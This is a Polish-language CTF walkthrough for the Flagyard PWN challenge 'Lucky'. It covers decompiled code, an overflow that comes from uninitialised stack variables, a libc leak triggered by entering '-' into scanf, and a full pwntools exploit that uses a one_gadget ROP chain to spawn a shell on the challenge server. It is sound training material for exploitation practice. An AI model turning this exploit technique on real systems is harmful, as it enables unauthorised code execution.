---
title: "Flagyard - Lucky"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
  - CTF
tags:
  - Hacking
  - Walkthrough
  - CTF
  - Flagyard
  - PWN
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Flagyard - Lucky
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Portal:|[Flagyard](https://flagyard.com/)|
|Task:|[Lucky](https://flagyard.com/labs/training-labs/5/challenges/036364b3-9ea8-426f-80c5-0ef56eddc748)|
|Category:|PWN|

# Wstęp

Dawno nie pisałem po polsku, więc dla odmiany coś napiszę. A jak... 😉 Zadanie Lucky należy do kategorii easy, ale dawno nie robiłem czegoś tak podstępnego i trudnego dla mnie. Wracałem do niego wielokrotnie i nie mogłem ruszyć dalej. Gdy już udało się coś osiągnąć, okazywało się, że to dopiero połowa drogi... albo i mniej. Solucji oczywiście brak – możliwe, że to pierwsze takie podejście? Pytałem innych o hinty dotyczące tego zadania, bo wiele osób je ukończyło, ale nie wiedziało jak – mieli tylko flagę. A po co mi flaga, skoro nie wiem, jak to zrobić?

Zadanie pełne jest pułapek i króliczych nor. A to przecież tylko PWN easy! Co dostajemy na starcie? Spakowany plik lucky oraz bibliotekę libc-2.31.so. To sugeruje, że może pojawić się scenariusz return-to-libc.

Ogólnie zadanie polega na wprowadzeniu imienia, dat i wygenerowaniu numerów. Na ich podstawie otrzymujemy identyfikator, który zależy od podanych danych. Po uruchomieniu programu mamy możliwość generowania numerów, ich modyfikacji, itd. Poniżej znajdziesz przykłady działania programu, ale zanim przejdziemy dalej, musimy "połączyć" glibc z binarką. Najszybszy sposób to użycie narzędzia pwninit.
{: .text-justify}
```bash
./lucky_patched
Welcome to the 100 percent accurate lucky number generator. You will definitely win the lottery with this number generator.
1. Enter your name and birthday
2. Generate numbers
> 1
Enter your name: imie
Enter your birth year: 1
Enter your birth month: 2
Enter your birth day: 3
Hello imie
, your ID is 44651081065
```
```bash
Welcome to the 100 percent accurate lucky number generator. You will definitely win the lottery with this number generator.
1. Enter your name and birthday
2. Generate numbers
> 2
Oh it's your first time here? I'll give you more lucky numbers than usual!
NUM 8
Your lucky numbers are:
73
4
2
3
90
18
83
58
How many numbers do you want to change?
2
Enter new number: 1
Enter new number: 1
....
> 
```
## Opis techniczny
Po wykonaniu polecenia checksec okazuje się, że binarka posiada praktycznie cały zestaw zabezpieczeń, z wyjątkiem canary.
{: .text-justify}
### Checksec

```bash
checksec --file=./lucky_patched
[*] './lucky_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```
### Dekompilacja
Kod źródłowy dekompilujemy przy użyciu Ghidra. Dzięki temu możemy przyjrzeć się, jak mniej więcej działają poszczególne funkcje. Dokładnych adresów jednak nie znamy, ponieważ symbole zostały usunięte (zestripowane). Na podstawie analizy jedną z funkcji nazwałem generate_number, a drugą enter_name. Warto jednak zauważyć, że nie ogranicza się to tylko do podawania imienia...
{: .text-justify}
```c

void generate_number(void)

{
  int iVar1;
  uint local_38 [12];
  
  if (numerki2_init0 != 0) {
    local_38[2] = 4;
  }
  if (numerki1_init1 != 0) {
    puts("Oh it\'s your first time here? I\'ll give you more lucky numbers than usual!");
    local_38[2] = 8;
    numerki1_init1 = 0;
  }
  printf("NUM %d\n",(ulong)local_38[2]);
  puts("Your lucky numbers are:");
  srand((uint)numerki2_init0);
  for (local_38[0] = 0; (int)local_38[0] < (int)local_38[2]; local_38[0] = local_38[0] + 1) {
    iVar1 = rand();
    local_38[(long)(int)local_38[0] + 4] = iVar1 % 100;
    printf("%d\n",(ulong)local_38[(long)(int)local_38[0] + 4]);
  }
  puts("How many numbers do you want to change?");
  __isoc99_scanf(&DAT_555555556118,local_38 + 3);
  if ((int)local_38[3] <= (int)local_38[2]) {
    for (local_38[1] = 0; (int)local_38[1] < (int)local_38[3]; local_38[1] = local_38[1] + 1) {
      printf("Enter new number: ");
      __isoc99_scanf(&DAT_555555556118,local_38 + (long)(int)local_38[1] + 4);
    }
  }
  return;
}
```
```c
void enter_name(void)

{
  int iVar1;
  ssize_t sVar2;
  ulong local_70;
  ulong local_68;
  ulong local_60;
  ulong local_58 [9];
  int local_c;
  
  local_c = 0;
  printf("Enter your name: ");
  memset(local_58,0,0x40);
  sVar2 = read(0,local_58,0x3f);
  *(undefined *)((long)local_58 + sVar2) = 0;
  printf("Enter your birth year: ");
  __isoc99_scanf(&podaj1,&local_60);
  printf("Enter your birth month: ");
  __isoc99_scanf(&podaj1,&local_68);
  printf("Enter your birth day: ");
  __isoc99_scanf(&podaj1,&local_70);
  while (iVar1 = local_c, local_c < 8) {
    local_c = local_c + 1;
    numerki2_init0 = numerki2_init0 ^ local_58[iVar1];
  }
  numerki2_init0 = local_60 ^ local_68 ^ local_70 ^ numerki2_init0;
  printf("Hello %s, your ID is %ld\n",local_58,numerki2_init0);
  return;
}
```
# Analiza
Po dłuższym czasie szukania nie udało mi się znaleźć niczego oczywistego. Nie było ani klasycznego przepełnienia bufora, ani podatności printf. Rozważałem również wykorzystanie numerów srand, ale i to nie przyniosło rezultatów. Poświęciłem trochę czasu na eksperymenty i próby, ale nie znalazłem rozwiązania.

W końcu zapytałem "Poniego", czy mógłby rzucić na to okiem. Akurat miał sesję, więc nie mógł się zająć tym szczegółowo, ale to, co mi powiedział, wystarczyło, żeby zrobić pierwszy krok – odnaleźć możliwość przepełnienia bufora. Chodziło o to, żeby w funkcji generate_number żaden z warunków nie został spełniony. Dzięki temu w zmiennych lokalnych pozostają losowe dane (śmieci), co pozwala na wykonanie dłuższej pętli.
{: .text-justify}
## warunek 1
```c
  if (numerki2_init0 != 0) {
    local_38[2] = 4;
  }
```
## warunek 2
```c
  if (numerki1_init1 != 0) {
    puts("Oh it\'s your first time here? I\'ll give you more lucky numbers than usual!");
    local_38[2] = 8;
    numerki1_init1 = 0;
  }
```
Drugi warunek jest prosty – wystarczy wejść do niego jeden raz. Z pierwszym jest nieco trudniej, dlatego trzeba wrócić do funkcji enter_name. Tam odbywa się operacja XOR. Jeśli dwukrotnie wpiszemy te same dane, to ID będzie równe 0. Świetnie, ale dlaczego nie wypisuje więcej cyfr, niż zakładaliśmy? Niestety, zmienne lokalne ustawiają się na zero, więc trzeba im trochę "pomóc"...
{: .text-justify}
```bash
1. Enter your name and birthday
2. Generate numbers
> 2
NUM 0
Your lucky numbers are:
How many numbers do you want to change?
```
# Przepełnienie bufora
Pracowałem nad tym trochę i okazało się, że aby umieścić "śmieci" w pamięci lokalnej zamiast zer, wystarczy wpisać dłuższe imię w funkcji enter_name. W ten sposób kontrolujemy, ile wygenerowanych numerów ma zostać wypisanych. Na szczęście możemy wygenerować ich naprawdę dużo. Następnie można je edytować i nadpisać ich adresami, ale co z tego, skoro nie mamy żadnych wyciekniętych adresów? Dzięki funkcji `enter_name(b"\xd3"*41)` generujemy dowolną liczbę cyfr – tutaj, dla przykładu, jest to liczba 211.
{: .text-justify}
```bash
[DEBUG] Received 0x1df bytes:
    b'NUM 211\n'
    b'Your lucky numbers are:\n'
    b'83\n'
    b'86\n'
    b'77\n'
    b'15\n'
    b'93\n'
    b'35\n'
    b'86\n'
    b'92\n'
    b'49\n'
    b'21\n'
    b'62\n'
    b'27\n'
    b'90\n'
    b'59\n'
    b'63\n'
    b'26\n'
    b'40\n'
    b'26\n'
    b'72\n'
    b'36\n'
    b'11\n'
    b'68\n'
    b'67\n'
    b'29\n'
    b'82\n'
```
Myślałem, że z tych cyfr uda mi się ustalić adresu stosu itd. I racja niestety, nie tędy droga...
# printf
Ten wycieknięty adres musi znajdować się gdzieś w funkcji enter_name, ale nie można go wyciągnąć standardowymi metodami, takimi jak %1$p, %lx, itd. Próbowałem XOR-owania, dłuższych stringów – nic z tego. Dopiero przypadkiem, gdy wpisałem przy cyfrach sam minus (zresztą sam plus też można wpisać), zauważyłem interesujący adres `139790197586304`, czyli `0x7f237111f980`. Był to adres jakiejś wyciekniętej funkcji z biblioteki glibc. Czy to oznacza, że jesteśmy już w domu? Oczywiście, w miejscu, gdzie podałem 1, należy wpisać `\x00`, ale to tylko przykład.
{: .text-justify}
```bash
1. Enter your name and birthday
2. Generate numbers
> 1
Enter your name: 1
Enter your birth year: -
Enter your birth month: -
Enter your birth day: -
Hello 1
, your ID is 139790197586304
Welcome to the 100 percent accurate lucky number generator. You will definitely win the lottery with this number generator.
1. Enter your name and birthday
2. Generate numbers
>
```
# ROP
Dobrze, mamy wyciekniętą funkcję, więc możemy w prosty sposób zbudować ROP-y. Brzmi prosto... ale o szczegółach później.
{: .text-justify}
```py
    ID=enter_name(b'\x00')
    libc_leak=int(ID)-0x1eb980 #leak
    libc.address=libc_leak
    system=libc.address+0x55410
    puts = libc.sym['puts']
    ...
  ```
# Konwersja liczb
Idea jest taka, że znamy już adresy, ale musimy umieścić je na stosie, podając liczby. Na szczęście konwersję (szybko?) obliczył Chat GPT.
{: .text-justify}
```py
    payload=[ret,pop_r12,0,one_gadget]
    for rop in payload:
        liczba=rop
    # Rozbicie liczby na dolne i górne 32 bity:
        low  = liczba & 0xffffffff
        high = (liczba >> 32) & 0xffffffff

        # Konwersja na łańcuchy znaków zakodowane jako bajty:
        low_bytes  = str(low).encode()
        high_bytes = str(high).encode()

        # Wysyłanie wartości – przykładowo najpierw low, potem high:        
        p.sendlineafter(b'Enter new number:', low_bytes)
        p.sendlineafter(b'Enter new number:', high_bytes)
```
## Payload z system (libc)
OK, wrzucamy payload, ale coś nie działa. Dlaczego? Przecież wstawiamy pop rdi, a w rdi ustawiamy /bin/sh. Następny ROP to wywołanie system. Dlaczego to nie działa??? Nie wiem.
{: .text-justify}
```bash
0:0000│ rsp 0x7ffe808271c8 —▸ 0x7f9c6b9d5679 ◂— ret
01:0008│     0x7ffe808271d0 —▸ 0x7f9c6b9d6b72 ◂— pop rdi
02:0010│     0x7ffe808271d8 —▸ 0x7f9c6bb675aa ◂— 0x68732f6e69622f /* '/bin/sh' */
03:0018│     0x7ffe808271e0 —▸ 0x7f9c6ba05410 (system) ◂— endbr64
04:0020│     0x7ffe808271e8 ◂— 0x2400000048 /* 'H' */
```
```bash
pwndbg> c
Continuing.
[Attaching after process 66286 vfork to child process 66366]
[New inferior 2 (process 66366)]
[Detaching vfork parent process 66286 after child exit]
[Inferior 1 (process 66286) detached]
[Inferior 2 (process 66366) exited with code 0177]
```
## Payload z one_gadget
Spróbujmy z `one_gadget`. Jest! Tylko trzeba wyzerowac `R12`, ale na to jest jakiś `ROP`.
{: .text-justify}
```bash
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```
# Exploit
```py
from pwn import *             
#context.log_level='debug'    

context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 

HOST="34.252.33.37:31128"
ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./lucky_patched"
binary = context.binary = ELF(BINARY_NAME, checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    

def enter_name (name):
    p.sendlineafter(b">",b'1')
    p.sendafter(b"name",name)    #\xd3 #tyle ma wyswietlic
    p.sendlineafter(b"year",b'+')
    p.sendlineafter(b"month",b'-')
    p.sendlineafter(b"day",b'+')
    p.recvuntil(b'your ID is')
    ID=p.recvline().strip()
    return ID
    
def generate_numbers_0 ():
    p.sendlineafter(b">",b'2')
    p.sendlineafter(b"to change?", b'0')

def set_libc_adresses (libc):
    ID=enter_name(b'\x00')
    libc_leak=int(ID)-0x1eb980 #leak
    libc.address=libc_leak
    system=libc.address+0x55410
    puts = libc.sym['puts']
    
    rop=ROP(libc)
    pop_r12 = rop.find_gadget(['pop r12', 'ret'])[0]     
    ret = rop.find_gadget(['ret'])[0]
    one_gadget=libc.address+0xe6c7e
    log.info(f"pop rdi gadget: {hex(one_gadget)}")
    info (f"libc: {int(libc_leak):#x}")

    return ret,one_gadget,pop_r12
    
def set_payload ():
    ile_sprawdzic_1=b'18' #ret,one_gadget,pop_r12,0

    p.sendlineafter(b">", b'2')
    p.sendlineafter(b"How many numbers do you want to change?", ile_sprawdzic_1)    
    for i in range (int(ile_sprawdzic_1.decode())-8): #4 payloads*2    
        liczba = 0
        p.sendlineafter(b'Enter new number:', bytes(str(liczba), 'utf-8'))
    
    payload=[ret,pop_r12,0,one_gadget]
    for rop in payload:
        liczba=rop
    # Rozbicie liczby na dolne i górne 32 bity:
        low  = liczba & 0xffffffff
        high = (liczba >> 32) & 0xffffffff

        # Konwersja na łańcuchy znaków zakodowane jako bajty:
        low_bytes  = str(low).encode()
        high_bytes = str(high).encode()

        # Wysyłanie wartości – przykładowo najpierw low, potem high:        
        p.sendlineafter(b'Enter new number:', low_bytes)
        p.sendlineafter(b'Enter new number:', high_bytes)
                
ret,one_gadget,pop_r12=set_libc_adresses(libc)
#ret,pop_rdi,system,binsh = set_libc_adresses (libc) #doesn't work!!!
#pop_rax,pop_rdi,pop_rsi,syscall,binsh=set_libc_adresses (libc) #doesn't work!!!

ID=enter_name(b'\x00') #to ID=zero
info (f"ID: {ID}")

generate_numbers_0 ()   #set first conditional to zero

ID=enter_name(b"\xd3"*41) #to BO generate_numbers
info (f"ID: {ID}")
ID=enter_name(b"\xd3"*41) #to 0
info (f"ID: {ID}")

set_payload ()
p.interactive()
```
# Podsumowanie
Flagę pominę, bo możecie ją sami odtworzyć. Co do zadania – było ono jednocześnie męczące, frustrujące i... satysfakcjonujące. To na pewno nie było easy. Gdy w końcu zdobyłem flagę, polubiłem to zadanie. Wcześniej go nienawidziłem. To nie było szczęśliwe zadanie ;)
{: .text-justify}


